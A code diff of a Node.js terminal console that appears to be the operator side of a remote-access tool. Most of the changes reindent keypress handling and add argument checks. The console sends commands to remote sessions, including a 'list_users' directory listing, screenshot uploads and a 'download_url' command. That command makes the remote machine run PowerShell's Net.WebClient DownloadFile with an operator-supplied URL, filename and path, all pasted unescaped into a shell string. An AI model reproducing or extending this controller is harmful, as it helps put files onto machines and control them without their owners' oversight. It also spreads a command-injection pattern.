@@ -61,37 +61,38 @@ process.stdin.on("keypress", function (ch, key) {
 		}
 	} else if (key && key.name == "left") {
 		try{
-		if (cursorPos - 1 >= 0) {
-			cliCursor.hide();
-			cursorPos = cursorPos - 1;
-			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
-			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
-			cmdHistory[cmdHistory.length - pos] = before + cc + after;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
-		}}catch(e){}
+			if (cursorPos - 1 >= 0) {
+				cliCursor.hide();
+				cursorPos = cursorPos - 1;
+				var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
+				var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
+				var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
+				cmdHistory[cmdHistory.length - pos] = before + cc + after;
+				process.stdout.clearLine();
+				process.stdout.cursorTo(0);
+				process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
+			}
+		}catch(e){}
 	} else if (key && key.name == "right") {
 		try{
-		if (cursorPos < cmdHistory[cmdHistory.length - pos].length - 1) {
-			cursorPos = cursorPos + 1;
-			var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
-			var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
-			var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
-			cmdHistory[cmdHistory.length - pos] = before + cc + after;
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
+			if (cursorPos < cmdHistory[cmdHistory.length - pos].length - 1) {
+				cursorPos = cursorPos + 1;
+				var before = cmdHistory[cmdHistory.length - pos].slice(0, cursorPos);
+				var cc = cmdHistory[cmdHistory.length - pos][cursorPos];
+				var after = cmdHistory[cmdHistory.length - pos].slice(cursorPos + 1, cmdHistory[cmdHistory.length - pos.length - 1]);
+				cmdHistory[cmdHistory.length - pos] = before + cc + after;
+				process.stdout.clearLine();
+				process.stdout.cursorTo(0);
+				process.stdout.write(workingDir.bold.white + "> ".white + before + cc.bgWhite.black + after);
 
-		} else {
-			process.stdout.clearLine();
-			process.stdout.cursorTo(0);
-			process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
-			cliCursor.show();
-			cursorPos = cursorPos + 1;
-		}
-	}catch(e){}
+			} else {
+				process.stdout.clearLine();
+				process.stdout.cursorTo(0);
+				process.stdout.write(workingDir.bold.white + "> ".white + cmdHistory[cmdHistory.length - pos]);
+				cliCursor.show();
+				cursorPos = cursorPos + 1;
+			}
+		}catch(e){}
 	} else if (key && key.name == "backspace") {
 		try{
 		if (cursorPos != cmdHistory[cmdHistory.length - pos].length - 1) {
@@ -115,7 +116,7 @@ process.stdin.on("keypress", function (ch, key) {
 			cursorPos = cmdHistory[cmdHistory.length - pos].length - 1;
 		}}catch(e){}
 	} else if (key && key.ctrl && key.name == 'c') {
-		process.exit()
+		process.exit();
 	} else if (key && key.name == "return") {
 		process.stdout.clearLine();
 		process.stdout.cursorTo(0);
@@ -124,12 +125,30 @@ process.stdin.on("keypress", function (ch, key) {
 		if (cmdHistory[cmdHistory.length - 1] == "screenshot") {
 			console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
 		}else if (cmdHistory[cmdHistory.length - 1].startsWith("download_url")) {
-			var string = cmdHistory[cmdHistory.length - 1].split(" ");
-			var url = string[1];
-			var filename = string[2];
-			var path = string[3];
-			console.log("[".white + "+".blue + "]".white + "Download request sent ! Please wait while downloading...".bold);
-			sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
+			if(cmdHistory[cmdHistory.length - 1].split(" ").length == 4){
+				var string = cmdHistory[cmdHistory.length - 1].split(" ");
+				var url = string[1];
+				var filename = string[2];
+				var path = string[3];
+				if(url.indexOf("http") > -1){
+					console.log("[".white + "+".blue + "]".white + "Download request sent ! Please wait while downloading...".bold);
+					sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
+				}else{
+					console.log("[".white + "+".red + "]".white + " Wrong URL !");
+					if (key != undefined) cmdHistory[cmdHistory.length - pos] += key.sequence;
+					else cmdHistory[cmdHistory.length - pos] += ch;
+					process.stdout.clearLine();
+					process.stdout.cursorTo(0);
+					process.stdout.write(workingDir.bold.white + "> ".white);
+				}
+			}else{
+				console.log("[".white + "+".red + "]".white + " Too few arguments : ".red + "Usage : ".white + "download_url <url> <filename> <path>".underline);
+				if (key != undefined) cmdHistory[cmdHistory.length - pos] += key.sequence;
+				else cmdHistory[cmdHistory.length - pos] += ch;
+				process.stdout.clearLine();
+				process.stdout.cursorTo(0);
+				process.stdout.write(workingDir.bold.white + "> ".white);
+			}
 		}else if(cmdHistory[cmdHistory.length - 1] == "list_users"){
 			sessions[currentSession].send("cd /Users & dir");
 		}else{
